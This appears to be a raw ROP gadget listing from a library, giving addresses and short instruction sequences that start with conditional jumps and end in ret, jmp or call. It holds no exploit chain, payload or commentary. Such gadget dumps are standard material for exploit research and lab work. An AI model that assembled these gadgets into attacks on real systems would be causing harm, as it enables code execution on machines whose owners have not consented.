0x00002aaaaabf627e : jne 0x12127b ; mov dword ptr fs:[rbp], r12d ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabf79cc : jne 0x1229a7 ; mov qword ptr [rsi], rcx ; xor eax, eax ; ret
0x00002aaaaabf81f4 : jne 0x123244 ; mov eax, r8d ; ret
0x00002aaaaabfaa9d : jne 0x1259ea ; ret
0x00002aaaaabfad7a : jne 0x125b90 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabfcb8c : jne 0x127b92 ; ret
0x00002aaaaabfcbcc : jne 0x127bc0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabffdf3 : jne 0x12ae0a ; xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac01003 : jne 0x12c01a ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac0116c : jne 0x12c18a ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac01aa6 : jne 0x12cac2 ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac01ae3 : jne 0x12cafa ; xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac01b93 : jne 0x12cbaa ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac01be3 : jne 0x12cbfa ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac01c63 : jne 0x12cc7a ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac01cfd : jne 0x12cd48 ; mov dword ptr [rsi], 0 ; ret
0x00002aaaaac025b5 : jne 0x12d5c8 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaac026bd : jne 0x12d657 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac03a13 : jne 0x12ea2a ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac04828 : jne 0x12f842 ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac048c3 : jne 0x12f8da ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac0495e : jne 0x12f97a ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac049dd : jne 0x12f9fa ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac07458 : jne 0x132462 ; ret
0x00002aaaaac0b584 : jne 0x136596 ; jmp 0x1365b0
0x00002aaaaac0d337 : jne 0x138323 ; pop rbx ; ret
0x00002aaaaac0d5b8 : jne 0x1385c2 ; ret
0x00002aaaaac0eeb3 : jne 0x139eaa ; mov rax, qword ptr [rdi + 8] ; mov rax, qword ptr [rax] ; jmp rax
0x00002aaaaac0fc76 : jne 0x13acd2 ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac0fd36 : jne 0x13ad92 ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac0fdf6 : jne 0x13ae52 ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac0feb6 : jne 0x13af12 ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac103c7 : jne 0x13b3a0 ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac10892 : jne 0x13b8a7 ; mov eax, 1 ; ret
0x00002aaaaac108d2 : jne 0x13b8e7 ; mov eax, 1 ; ret
0x00002aaaaac152bc : jne 0x1402cd ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac17a9b : jne 0x142a7e ; add rsp, 0x48 ; ret
0x00002aaaaac17a7d : jne 0x142ab0 ; xor eax, eax ; add rsp, 0x48 ; ret
0x00002aaaaac17b45 : jne 0x142b58 ; xor eax, eax ; add rsp, 0x48 ; ret
0x00002aaaaac17bb8 : jne 0x142bd6 ; add rsp, 0x38 ; ret
0x00002aaaaac187c8 : jne 0x1437d4 ; xor eax, eax ; ret
0x00002aaaaac187f8 : jne 0x143804 ; xor eax, eax ; ret
0x00002aaaaac18828 : jne 0x143834 ; xor eax, eax ; ret
0x00002aaaaac18858 : jne 0x143864 ; xor eax, eax ; ret
0x00002aaaaac18888 : jne 0x143894 ; xor eax, eax ; ret
0x00002aaaaac188b8 : jne 0x1438c4 ; xor eax, eax ; ret
0x00002aaaaac3cc81 : jne 0x168236 ; ret
0x00002aaaaac427bc : jne 0x16d7fb ; mov rax, qword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x00002aaaaac43e1d : jne 0x16ee47 ; xor eax, eax ; ret
0x00002aaaaac43411 : jne 0x16ee4b ; xor eax, eax ; ret
0x00002aaaaac43439 : jne 0x16ee57 ; xor eax, eax ; ret
0x00002aaaaac44c5d : jne 0x16fc87 ; xor eax, eax ; ret
0x00002aaaaac44a41 : jne 0x16fc8b ; xor eax, eax ; ret
0x00002aaaaac44c91 : jne 0x16fc9a ; xor eax, eax ; ret
0x00002aaaaac44a67 : jne 0x16fc9e ; xor eax, eax ; ret
0x00002aaaaac44da5 : jne 0x16fd36 ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaac44d77 : jne 0x16fd36 ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaac44d76 : jne 0x16fd37 ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaac44e40 : jne 0x16fd3a ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaac44dfa : jne 0x16fd3a ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaac44df9 : jne 0x16fd3b ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaac44e86 : jne 0x16ff5a ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaac44e85 : jne 0x16ff5b ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaac44ed9 : jne 0x16ffca ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaac44ed8 : jne 0x16ffcb ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaac46504 : jne 0x171718 ; xor eax, eax ; ret
0x00002aaaaac46709 : jne 0x171729 ; xor eax, eax ; ret
0x00002aaaaac465b1 : jne 0x17172d ; xor eax, eax ; ret
0x00002aaaaac46721 : jne 0x17172e ; cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x00002aaaaac46d36 : jne 0x171d44 ; xor eax, eax ; ret
0x00002aaaaac46c0d : jne 0x171d46 ; ret
0x00002aaaaac484fd : jne 0x1734ee ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac48550 : jne 0x173530 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac485f8 : jne 0x173620 ; mov rdi, qword ptr [r13] ; call 0x1f8b0
0x00002aaaaac4868d : jne 0x17367d ; pop rbx ; ret
0x00002aaaaac48735 : jne 0x17371b ; pop rbx ; ret
0x00002aaaaac488a8 : jne 0x1738b3 ; ret
0x00002aaaaac48989 : jne 0x17397c ; pop rbx ; ret
0x00002aaaaac6b919 : jne 0x196912 ; push qword ptr [rsp + rbp*4 + 0x77040000] ; in eax, dx ; jmp rsp
0x00002aaaaac6d655 : jne 0x19865e ; add byte ptr [rdx + rcx - 0xa], ah ; jmp rsp
0x00002aaaaac7ba21 : jne 0x1a6a14 ; jmp qword ptr [rax]
0x00002aaaaab08bd4 : jne 0x33bb2 ; ret
0x00002aaaaab08e88 : jne 0x33e7b ; mov eax, dword ptr [r9 + rdx*4 + 8] ; add rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab09ad0 : jne 0x34ae6 ; add rsp, 0x28 ; ret
0x00002aaaaab09e0b : jne 0x34e1e ; add rsp, 0x28 ; ret
0x00002aaaaab0a308 : jne 0x35313 ; ret
0x00002aaaaab0b264 : jne 0x3627b ; mov edx, dword ptr [rdi] ; xor eax, eax ; test edx, edx ; sete al ; ret
0x00002aaaaab0b8a7 : jne 0x368c3 ; lea edx, dword ptr [rax - 1] ; mov dword ptr [rip + 0x38c7d6], edx ; ret
0x00002aaaaaad8796 : jne 0x3774 ; ret 0x975
0x00002aaaaab0f61c : jne 0x3a5e8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0f6cb : jne 0x3a6d3 ; pop rbx ; ret
0x00002aaaaab12247 : jne 0x3d2b8 ; adc eax, 0xc1834900 ; add dword ptr [rax - 0x7d], ecx ; ret 0x6610
0x00002aaaaab1c058 : jne 0x47056 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab1d061 : jne 0x48047 ; mov eax, 1 ; ret
0x00002aaaaab1d087 : jne 0x4807c ; xor eax, eax ; ret
0x00002aaaaab1d1f9 : jne 0x481df ; mov eax, 1 ; ret
0x00002aaaaab1d21f : jne 0x48214 ; xor eax, eax ; ret
0x00002aaaaab1d4c7 : jne 0x484b6 ; mov rax, rdx ; ret
0x00002aaaaab1db7f : jne 0x48b76 ; mov rax, rdx ; ret
0x00002aaaaab1f6f1 : jne 0x4a6dd ; mov rax, rsi ; ret
0x00002aaaaab1f775 : jne 0x4a755 ; mov rax, rsi ; ret
0x00002aaaaab3fcc1 : jne 0x6acd6 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab43571 : jne 0x6e548 ; mov dword ptr fs:[rdx], 5 ; pop rbx ; ret
0x00002aaaaab45b6a : jne 0x70b8b ; pop rbx ; mov eax, 1 ; pop rbp ; pop r12 ; ret
0x00002aaaaab46c01 : jne 0x71bf3 ; ret
0x00002aaaaab4969c : jne 0x746a3 ; pop rbx ; ret
0x00002aaaaab49f49 : jne 0x74f63 ; mov ecx, dword ptr [rdx + 0x48] ; cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x00002aaaaab49fe1 : jne 0x7503d ; lea r9, qword ptr [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x00002aaaaab4a4c4 : jne 0x754da ; mov edx, dword ptr [rdi + 0xc0] ; mov eax, edx ; ret
0x00002aaaaab4bff1 : jne 0x76fc8 ; mov dword ptr fs:[rdx], 5 ; pop rbx ; ret
0x00002aaaaab4d160 : jne 0x78176 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4d2ec : jne 0x78310 ; pop rbx ; mov eax, 1 ; pop rbp ; pop r12 ; ret
0x00002aaaaab4f395 : jne 0x7a3a2 ; ret
0x00002aaaaab4ff41 : jne 0x7af33 ; ret
0x00002aaaaab50c61 : jne 0x7bc78 ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab50fd2 : jne 0x7bfbd ; pop rbx ; ret
0x00002aaaaab5100c : jne 0x7c005 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab51846 : jne 0x7c83b ; ret
0x00002aaaaab51883 : jne 0x7c89a ; sub edx, dword ptr [rax + 0x18] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x00002aaaaab528bf : jne 0x7d891 ; mov rdi, rbx ; neg rdi ; call qword ptr [r15]
0x00002aaaaab528d7 : jne 0x7d908 ; xor edi, edi ; call qword ptr [r15]
0x00002aaaaab583dc : jne 0x833a3 ; ret
0x00002aaaaab5a953 : jne 0x85965 ; jmp 0x8597f
0x00002aaaaab5cb8f : jne 0x87b45 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab5da21 : jne 0x88a13 ; ret
0x00002aaaaab5dacb : jne 0x88ac3 ; ret
0x00002aaaaab5e14b : jne 0x8915d ; lea rax, qword ptr [rip + 0xc] ; ret
0x00002aaaaab5fd13 : jne 0x8ad1e ; xor rax, rax ; ret
0x00002aaaaab5ffa7 : jne 0x8afb9 ; lea rax, qword ptr [rip + 0x10] ; ret
0x00002aaaaab61c5e : jne 0x8cc24 ; add rsp, 8 ; ret
0x00002aaaaab61c81 : jne 0x8cc96 ; add rsp, 8 ; ret
0x00002aaaaab62f69 : jne 0x8dfc5 ; xor rax, rax ; ret
0x00002aaaaab62f29 : jne 0x8dfe9 ; xor rax, rax ; ret
0x00002aaaaab63011 : jne 0x8e024 ; lea rax, qword ptr [rip + 0x26] ; ret
0x00002aaaaab6373a : jne 0x8e723 ; ret
0x00002aaaaab63923 : jne 0x8e80f ; mov rax, rdi ; ret
0x00002aaaaab63879 : jne 0x8e865 ; mov rax, rdi ; ret
0x00002aaaaab63e37 : jne 0x8ee49 ; lea rax, qword ptr [rip + 0x80] ; ret
0x00002aaaaab63e9a : jne 0x8eeac ; lea rax, qword ptr [rip + 0xd] ; ret
0x00002aaaaab66127 : jne 0x91139 ; lea rax, qword ptr [rip + 0x80] ; ret
0x00002aaaaab6618a : jne 0x9119c ; lea rax, qword ptr [rip + 0xd] ; ret
0x00002aaaaab6888c : jne 0x9389f ; lea rax, qword ptr [rip + 0xb3db] ; ret
0x00002aaaaab689f8 : jne 0x938d0 ; ret
0x00002aaaaab68939 : jne 0x93923 ; ret
0x00002aaaaab6ae96 : jne 0x95e81 ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab6af40 : jne 0x95f4f ; jmp 0x95f09
0x00002aaaaab6b7d5 : jne 0x967cd ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab6b7a7 : jne 0x967dd ; mov rax, rdi ; pop rbx ; ret
0x00002aaaaab6b87d : jne 0x96874 ; xor eax, eax ; ret
0x00002aaaaab6b96d : jne 0x96964 ; pop rbx ; pop rbp ; ret
0x00002aaaaab71e10 : jne 0x9ce09 ; jmp 0x9c7bc
0x00002aaaaab7284a : jne 0x9d843 ; jmp 0x9c844
0x00002aaaaab72f36 : jne 0x9df2b ; ret
0x00002aaaaab72f7a : jne 0x9df6b ; ret
0x00002aaaaab72fd4 : jne 0x9dfb3 ; ret
0x00002aaaaab7307a : jne 0x9e068 ; cmp r8d, ecx ; je 0x9e068 ; ret
0x00002aaaaab730b9 : jne 0x9e0ac ; xor eax, eax ; ret
0x00002aaaaab73112 : jne 0x9e0f4 ; xor eax, eax ; ret
0x00002aaaaab73172 : jne 0x9e165 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaab7322b : jne 0x9e220 ; xor edx, edx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab732a9 : jne 0x9e291 ; pop rbx ; xor edx, edx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab734dd : jne 0x9e568 ; xor eax, eax ; ret
0x00002aaaaab7351a : jne 0x9e594 ; xor eax, eax ; ret
0x00002aaaaab73c5c : jne 0x9ec46 ; xor eax, eax ; sub eax, ecx ; ret
0x00002aaaaab7a9ca : jne 0xa6286 ; ret
0x00002aaaaab7c06d : jne 0xa7a96 ; ret
0x00002aaaaab7e5b1 : jne 0xa95a2 ; ret
0x00002aaaaab7e5a8 : jne 0xa95cb ; movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0xa95ab ; ret
0x00002aaaaab7e661 : jne 0xa9652 ; ret
0x00002aaaaab7e658 : jne 0xa967b ; movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0xa965b ; ret
0x00002aaaaab7e7d1 : jne 0xa97c6 ; lea rax, qword ptr [rcx - 1] ; ret
0x00002aaaaab7e921 : jne 0xa9916 ; sub rax, 1 ; ret
0x00002aaaaab7f267 : jne 0xaa25b ; ret
0x00002aaaaab80036 : jne 0xab0b2 ; ret
0x00002aaaaab7ff5f : jne 0xab0b6 ; ret
0x00002aaaaab7ff3e : jne 0xab0b8 ; xor eax, eax ; ret
0x00002aaaaab800e1 : jne 0xab0f4 ; lea rax, qword ptr [rip + 0xf596] ; ret
0x00002aaaaab804a3 : jne 0xab46b ; ret
0x00002aaaaab804e6 : jne 0xab4d9 ; mov dword ptr [rsi + 4], 0 ; ret
0x00002aaaaab805b9 : jne 0xab5a5 ; xor eax, eax ; ret
0x00002aaaaab805b4 : jne 0xab5ca ; cmp rdx, rax ; jne 0xab5aa ; xor eax, eax ; ret
0x00002aaaaab8099b : jne 0xab9f6 ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab80887 : jne 0xab9fa ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab80997 : jne 0xaba0a ; test al, 0xf0 ; jne 0xab9fa ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab80a73 : jne 0xaba43 ; ret
0x00002aaaaab80a5d : jne 0xaba53 ; ret
0x00002aaaaab80b2c : jne 0xabb24 ; xor eax, eax ; ret
0x00002aaaaab80b88 : jne 0xabb66 ; mov rax, rdi ; ret
0x00002aaaaab80b83 : jne 0xabc07 ; test r11d, r11d ; jne 0xabb6b ; mov rax, rdi ; ret
0x00002aaaaab80cb1 : jne 0xabcc4 ; lea rax, qword ptr [rip + 0xe916] ; ret
0x00002aaaaab80d65 : jne 0xabd72 ; mov dword ptr [r9 + 8], esi ; ret
0x00002aaaaab80da3 : jne 0xabd9b ; ret
0x00002aaaaab81edb : jne 0xace96 ; mov rax, rdx ; ret
0x00002aaaaab81f1c : jne 0xacf13 ; ret
0x00002aaaaab8e26a : jne 0xb9252 ; sub ebx, eax ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab8f673 : jne 0xba650 ; ret
0x00002aaaaab8f6a4 : jne 0xba69b ; ret
0x00002aaaaab94269 : jne 0xbf281 ; mov rax, rdx ; add rsp, 8 ; ret
0x00002aaaaab9ba82 : jne 0xc6a9a ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab9bcfd : jne 0xc6cba ; nop ; xor eax, eax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab9d1a7 : jne 0xc81b3 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaba1671 : jne 0xcc659 ; mov dword ptr fs:[0x2d0], eax ; ret
0x00002aaaaaba1de1 : jne 0xccdae ; ret
0x00002aaaaaba1e27 : jne 0xccdb2 ; mov eax, 0x7d00 ; ret
0x00002aaaaaba1e49 : jne 0xccdb6 ; mov eax, 0xfa ; ret
0x00002aaaaaba1ee9 : jne 0xccf12 ; ret
0x00002aaaaaba1f53 : jne 0xccf16 ; mov eax, 0x40 ; ret
0x00002aaaaaba1ff0 : jne 0xccfcf ; xor eax, eax ; ret
0x00002aaaaaba1fec : jne 0xcd068 ; add byte ptr [rax], al ; jne 0xccfd3 ; xor eax, eax ; ret
0x00002aaaaaba5a20 : jne 0xd0a04 ; ret
0x00002aaaaaba5a58 : jne 0xd0a1d ; mov eax, 1 ; ret
0x00002aaaaaba5a68 : jne 0xd0a33 ; mov eax, 1 ; ret
0x00002aaaaaba5af2 : jne 0xd0adb ; xor eax, eax ; cmp edx, 1 ; sete al ; ret
0x00002aaaaaba5b2e : jne 0xd0aef ; mov eax, 1 ; ret
0x00002aaaaaba5b46 : jne 0xd0b0c ; mov eax, 1 ; ret
0x00002aaaaaba5bbc : jne 0xd0bb1 ; nop ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba5cbe : jne 0xd0cb0 ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba9d1f : jne 0xd4d5b ; mov byte ptr [rdi + 8], 0x16 ; mov eax, 1 ; ret
0x00002aaaaaba9db5 : jne 0xd4d87 ; mov byte ptr [rdi + 8], 0x1a ; mov eax, 2 ; ret
0x00002aaaaabaafe7 : jne 0xd5fb6 ; mov dword ptr [rdi + 0x2c], r8d ; mov dword ptr [rdi + 0x30], r8d ; ret
0x00002aaaaabab76d : jne 0xd66bd ; pop rbx ; ret
0x00002aaaaabab76c : jne 0xd66be ; pop rbx ; ret
0x00002aaaaabab71a : jne 0xd6719 ; xor eax, eax ; cmp cl, byte ptr [rsi] ; je 0xd66bf ; pop rbx ; ret
0x00002aaaaabac0c9 : jne 0xd70a3 ; jmp 0xd7093
0x00002aaaaabae6ee : jne 0xd96c2 ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaabc3d3b : jne 0xeed29 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabc40d9 : jne 0xef119 ; pop rbx ; mov eax, 5 ; pop rbp ; pop r12 ; ret
0x00002aaaaabcbc61 : jne 0xf6ce9 ; add rsp, 0x20 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabcfaef : jne 0xfaa96 ; mov edi, ebp ; call 0xf6d06
0x00002aaaaabd07d5 : jne 0xfb7c0 ; or dword ptr [rdi], 0x80000000 ; xor eax, eax ; ret
0x00002aaaaabd2511 : jne 0xfd4e5 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd26d2 : jne 0xfd6a5 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd36d4 : jne 0xfe6c7 ; mov r8, rdi ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaabd4be2 : jne 0xffbf6 ; jmp 0xffc10
0x00002aaaaabffdcb : jno 0x12ada1 ; sub dword ptr [rax], eax ; pop rbx ; ret
0x00002aaaaac33387 : jno 0x15e397 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac335ca : jno 0x15e5da ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac436ce : jno 0x16e6dd ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac49c95 : jno 0x174c84 ; jmp rax
0x00002aaaaac49ca9 : jno 0x174c98 ; call rax
0x00002aaaaac69530 : jno 0x1944eb ; std ; call rcx
0x00002aaaaac6ad19 : jno 0x195d06 ; jmp rsp
0x00002aaaaac710d1 : jno 0x19c0d2 ; jmp qword ptr [rdi]
0x00002aaaaac752e6 : jno 0x1a02f4 ; ret
0x00002aaaaac752e6 : jno 0x1a02fa ; ret
0x00002aaaaac7708d : jno 0x1a2095 ; add byte ptr [rax], dh ; in eax, dx ; call rdx
0x00002aaaaac85009 : jno 0x1b0002 ; jmp qword ptr [rcx]
0x00002aaaaac85008 : jno 0x1b0003 ; jmp qword ptr [rcx]
0x00002aaaaac85039 : jno 0x1b0032 ; jmp qword ptr [rcx]
0x00002aaaaac85051 : jno 0x1b004a ; jmp qword ptr [rcx]
0x00002aaaaac87045 : jno 0x1b204e ; add byte ptr [rax], ch ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaaad71d7 : jno 0x2224 ; ret 0x1dd4
0x00002aaaaaad8957 : jno 0x39a1 ; xchg eax, ebx ; and cl, ah ; ret
0x00002aaaaab1d984 : jno 0x489d6 ; shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x00002aaaaab218ab : jno 0x4c8b4 ; add eax, 0xf8834800 ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab46271 : jno 0x7127f ; mov qword ptr [rdx + 0x20], rsi ; mov dword ptr [rcx], eax ; ret
0x00002aaaaab635e9 : jno 0x8e5fd ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00002aaaaab635e8 : jno 0x8e5fe ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00002aaaaab635e9 : jno 0x8e5ff ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00002aaaaab635e8 : jno 0x8e600 ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00002aaaaab73f30 : jno 0x9ef39 ; vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x00002aaaaab7416a : jno 0x9f173 ; vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x00002aaaaab742d1 : jno 0x9f2e2 ; vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x00002aaaaab74436 : jno 0x9f4ba ; adc qword ptr [rdi - 8], rdi ; ret
0x00002aaaaab74683 : jno 0x9f68c ; vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x00002aaaaab748bd : jno 0x9f8c6 ; vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x00002aaaaab74a24 : jno 0x9fa35 ; vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x00002aaaaab74b89 : jno 0x9fc0d ; adc qword ptr [rdi - 8], rdi ; ret
0x00002aaaaab74dd0 : jno 0x9fdd9 ; vmovups zmmword ptr [r9 - 0x40], zmm7 ; ret
0x00002aaaaab7500a : jno 0xa0013 ; vmovups zmmword ptr [r9 - 0x40], zmm15 ; ret
0x00002aaaaab75171 : jno 0xa0182 ; vmovups zmmword ptr [r9 + 0x1c0], zmm15 ; ret
0x00002aaaaab752d6 : jno 0xa035a ; adc qword ptr [rdi - 8], rdi ; ret
0x00002aaaaab80d63 : jno 0xabd72 ; jne 0xabd74 ; mov dword ptr [r9 + 8], esi ; ret
0x00002aaaaab80d69 : jno 0xabd76 ; ret
0x00002aaaaab944ff : jno 0xbf48d ; or al, 0 ; add rax, rdi ; jmp rax
0x00002aaaaab944ff : jno 0xbf491 ; or al, 0 ; add rax, rdi ; jmp rax
0x00002aaaaab959d5 : jno 0xc0962 ; ret 0xe283
0x00002aaaaab95a62 : jno 0xc09ef ; ret 0xe283
0x00002aaaaab95b2a : jno 0xc0ab7 ; ret 0xe283
0x00002aaaaab95b9a : jno 0xc0b27 ; ret 0xe283
0x00002aaaaab95ed3 : jno 0xc0e60 ; ret 0xe283
0x00002aaaaab95f4a : jno 0xc0ed7 ; ret 0xe283
0x00002aaaaab9619a : jno 0xc1127 ; ret 0xe283
0x00002aaaaab9622a : jno 0xc11b7 ; ret 0xe283
0x00002aaaaab96aa5 : jno 0xc1a9f ; ret
0x00002aaaaab97019 : jno 0xc2013 ; ret
0x00002aaaaab97068 : jno 0xc2062 ; ret
0x00002aaaaab97153 : jno 0xc20e0 ; ret 0xe283
0x00002aaaaab972eb : jno 0xc2278 ; ret 0xe283
0x00002aaaaab9737e : jno 0xc230b ; ret 0xe283
0x00002aaaaabb7428 : jno 0xe242e ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabc7b97 : jno 0xf2bac ; add byte ptr [rax + 0x63], cl ; or al, 0x8a ; add rdx, rcx ; jmp rdx
0x00002aaaaabf418e : jnp 0x11f1e0 ; test rdi, rdi ; jne 0x11f188 ; pop rbx ; ret
0x00002aaaaac09423 : jnp 0x13448f ; call rax
0x00002aaaaac09e43 : jnp 0x134e9f ; call rax
0x00002aaaaac56284 : jnp 0x1812ab ; jmp 0x18128a
0x00002aaaaac580c5 : jnp 0x183082 ; ret
0x00002aaaaac5e351 : jnp 0x18934a ; call rsi
0x00002aaaaac5e350 : jnp 0x18934b ; call rsi
0x00002aaaaac5eded : jnp 0x189de7 ; jmp qword ptr [rbx]
0x00002aaaaac6a2b1 : jnp 0x1952b1 ; call rax
0x00002aaaaac6a32d : jnp 0x19532d ; jmp qword ptr [rdx]
0x00002aaaaac6a331 : jnp 0x195335 ; jmp qword ptr [rdx + 0x22fffc7a]
0x00002aaaaac6a4ad : jnp 0x1954ad ; jmp rax
0x00002aaaaac6c211 : jnp 0x19720b ; ljmp ptr [rdi + 0x7cd40000] ; out dx, al ; jmp rsp
0x00002aaaaac6d78d : jnp 0x198796 ; add byte ptr [rsp - 0xa], dl ; call rsp
0x00002aaaaac70601 : jnp 0x19b602 ; jmp qword ptr [rdx]
0x00002aaaaac855e1 : jnp 0x1b05da ; jmp qword ptr [rcx]
0x00002aaaaac855f9 : jnp 0x1b05f2 ; jmp qword ptr [rcx]
0x00002aaaaac855f8 : jnp 0x1b05f3 ; jmp qword ptr [rcx]
0x00002aaaaac85611 : jnp 0x1b060a ; jmp qword ptr [rcx]
0x00002aaaaac85629 : jnp 0x1b0622 ; jmp qword ptr [rcx]
0x00002aaaaab1c055 : jnp 0x47061 ; add byte ptr [rbp - 0xa], dh ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabd0b58 : jnp 0x481bdfab ; add esp, 0x18 ; ret
0x00002aaaaab58561 : jnp 0x83563 ; xor eax, dword ptr [rax] ; mov qword ptr [rax], rdi ; ret
0x00002aaaaab92fb0 : jnp 0xbdfeb ; add byte ptr [rdx - 0x73], cl ; or al, 0x20 ; mov rdx, rax ; jmp 0xbdfc9
0x00002aaaaaba1f09 : jnp 0xccf67 ; add byte ptr [rax], al ; je 0xccf60 ; mov eax, 0x20 ; ret
0x00002aaaaabc8f81 : jnp 0xf3fdb ; stc ; dec dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x84 ; ret 0xa
0x00002aaaaabfc45d : jns 0x12746a ; add byte ptr [rax - 0x77], cl ; ret 0x1be
0x00002aaaaac32c07 : jns 0x15dc17 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac32e4a : jns 0x15de5a ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac571ce : jns 0x182164 ; ret 0xf869
0x00002aaaaac571cd : jns 0x182165 ; ret 0xf869
0x00002aaaaac595de : jns 0x184635 ; jmp 0x184576
0x00002aaaaac5ca79 : jns 0x187a70 ; jmp rdx
0x00002aaaaac5ca7d : jns 0x187a74 ; jmp rdx
0x00002aaaaac5ca81 : jns 0x187a78 ; jmp rdx
0x00002aaaaac5ca85 : jns 0x187a7c ; jmp rdx
0x00002aaaaac5ca89 : jns 0x187a80 ; jmp rdx
